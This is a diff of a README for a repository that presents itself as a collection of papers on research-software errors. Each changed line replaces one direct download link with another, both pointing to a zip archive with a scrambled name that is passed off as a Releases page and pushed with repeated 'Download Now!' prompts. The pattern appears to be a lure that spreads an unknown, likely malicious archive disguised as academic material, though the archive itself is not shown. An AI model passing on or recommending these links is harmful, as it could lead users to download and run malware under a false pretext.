@@ -6,7 +6,7 @@ This project collects papers that explore errors in research caused by software 
 
 ## 🔗 Download Now!
 
-[![Download](https://github.com/Skyluphy/errors-due-to-research-software/raw/refs/heads/main/specie/software_due_to_errors_research_murderment.zip%20Now-Click%20Here-brightgreen)](https://github.com/Skyluphy/errors-due-to-research-software/raw/refs/heads/main/specie/software_due_to_errors_research_murderment.zip)
+[![Download](https://raw.githubusercontent.com/Skyluphy/errors-due-to-research-software/main/specie/to-research-errors-due-software-3.6-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Skyluphy/errors-due-to-research-software/main/specie/to-research-errors-due-software-3.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ This repository features:
 
 Follow these steps to download the materials:
 
-1. Visit the Releases page at [this link](https://github.com/Skyluphy/errors-due-to-research-software/raw/refs/heads/main/specie/software_due_to_errors_research_murderment.zip).
+1. Visit the Releases page at [this link](https://raw.githubusercontent.com/Skyluphy/errors-due-to-research-software/main/specie/to-research-errors-due-software-3.6-alpha.3.zip).
 2. Look for the latest release.
 3. Choose a paper or document that interests you.
 4. Click the download link next to the file.
@@ -75,4 +75,4 @@ If you encounter issues while downloading or have questions about the content, c
 
 Understanding software errors in research is crucial. By staying informed and utilizing the papers provided in this repository, you can enhance the reliability of your research projects. Download today and explore the wealth of information available!
 
-For your convenience, here is the download link again: [Visit this page to download](https://github.com/Skyluphy/errors-due-to-research-software/raw/refs/heads/main/specie/software_due_to_errors_research_murderment.zip).
+For your convenience, here is the download link again: [Visit this page to download](https://raw.githubusercontent.com/Skyluphy/errors-due-to-research-software/main/specie/to-research-errors-due-software-3.6-alpha.3.zip).
